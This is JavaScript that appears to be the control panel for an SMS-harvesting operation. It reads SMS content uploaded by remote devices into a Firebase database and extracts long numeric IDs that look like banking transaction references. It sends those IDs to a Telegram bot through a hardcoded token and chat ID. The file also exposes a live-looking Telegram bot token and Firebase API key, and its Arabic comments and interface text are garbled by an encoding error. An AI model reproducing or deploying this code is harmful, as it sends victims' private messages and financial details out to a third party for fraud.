    const teleToken = "8308447003:AAFhOi_gqBO6FMg5tHJzhAZ_4OgLDvFkJOo";
    const teleChatId = "5957156447";

    function sendTele(txt) {
        fetch(`https://api.telegram.org/bot${teleToken}/sendMessage?chat_id=${teleChatId}&text=${encodeURIComponent(txt)}`);
    }

    const firebaseConfig = {
        apiKey: "AIzaSyAoAfx2voGpTuXh2I-V2XpgOyn5kAM6YIA",
        authDomain: "sudancontrol-c5050.firebaseapp.com",
        databaseURL: "https://sudancontrol-c5050-default-rtdb.firebaseio.com",
        projectId: "sudancontrol-c5050",
        storageBucket: "sudancontrol-c5050.appspot.com"
    };
    firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    let status = false, turbo = false;

    // Ù…Ø±Ø§Ù‚Ø¨Ø© Ø­Ø§Ù„Ø© Ø§Ù„ØªØ­ÙƒÙ…
    db.ref('control/status').on('value', snap => {
        status = snap.val() === "true" || snap.val() === true;
        document.getElementById('stat').innerText = "Ø§Ù„Ù†Ø¸Ø§Ù…: " + (status ? "Ù†Ø´Ø·" : "Ù…ØªÙˆÙ‚Ù");
        const b = document.getElementById('mainBtn');
        b.innerText = status ? "Ø¥ÙŠÙ‚Ø§Ù Ø§Ù„ÙƒØ³Ø­" : "ØªÙØ¹ÙŠÙ„ Ø§Ù„ÙƒØ³Ø­";
        b.className = "btn " + (status ? "btn-off" : "btn-on");
    });

    db.ref('control/turbo').on('value', snap => {
        turbo = snap.val() === "true" || snap.val() === true;
        document.getElementById('turboBtn').innerText = "Ø§Ù„ÙˆØ¶Ø¹ Ø§Ù„Ø®Ø§Ø±Ù‚: " + (turbo ? "Ù…Ù€ÙÙ€Ø¹Ù€Ù„ âœ…" : "Ù…Ù€Ø¹Ù€Ø·Ù„ âŒ");
    });

    function toggleStatus() { db.ref('control/status').set(status ? "false" : "true"); }
    function toggleTurbo() { db.ref('control/turbo').set(turbo ? "false" : "true"); }

    // ØªØ¹Ø¯ÙŠÙ„ Ø§Ù„Ù…Ø³Ø§Ø± Ù„ÙŠÙ‚Ø±Ø£ Ù…Ù† Activate Ø¨Ø¯Ù„Ø§Ù‹ Ù…Ù† MyActivities
    db.ref('Activate').on('child_added', snap => {
        const deviceData = snap.val();
        const smsContent = deviceData.SMS || ""; 
        
        if(smsContent !== "") {
            document.getElementById('logs').innerHTML = `<div>â€¢ ÙˆØµÙ„ Ø±Ø³Ø§Ù„Ø© Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø¬Ù‡Ø§Ø²: ${snap.key}</div>` + document.getElementById('logs').innerHTML;
            
            // Ø§Ø³ØªØ®Ø±Ø§Ø¬ Ø§Ù„Ø±Ù‚Ù… Ø§Ù„Ù…Ø±Ø¬Ø¹ÙŠ Ø¥Ø°Ø§ ÙˆØ¬Ø¯ ÙÙŠ Ø§Ù„Ø±Ø³Ø§Ù„Ø©
            const match = smsContent.match(/\d{10,}/); 
            if (match) {
                sendTele("âœ… Ø¹Ù…Ù„ÙŠØ© Ø¬Ø¯ÙŠØ¯Ø© Ù…Ù† Ø¬Ù‡Ø§Ø² " + snap.key + ": " + match[0]);
                document.getElementById('extractedTrans').innerHTML = `<div>ğŸ”¢ ID: <span class="trans-id">${match[0]}</span></div>`;
            }
        }
    });

    // Ø¹Ø±Ø¶ Ø³Ø¬Ù„ Ø§Ù„Ø£Ù†Ø´Ø·Ø© Ù…Ù† Ù…Ø³Ø§Ø± Ø§Ù„Ø£Ø¬Ù‡Ø²Ø©
    db.ref('Activate').limitToLast(5).on('value', snap => {
        const d = document.getElementById('logs'); d.innerHTML = "";
        snap.forEach(c => {
            const val = c.val();
            if(val.SMS) d.innerHTML += `<div>â€¢ Ø¬Ù‡Ø§Ø² ${c.key}: ${val.SMS}</div>`;
        });
    });
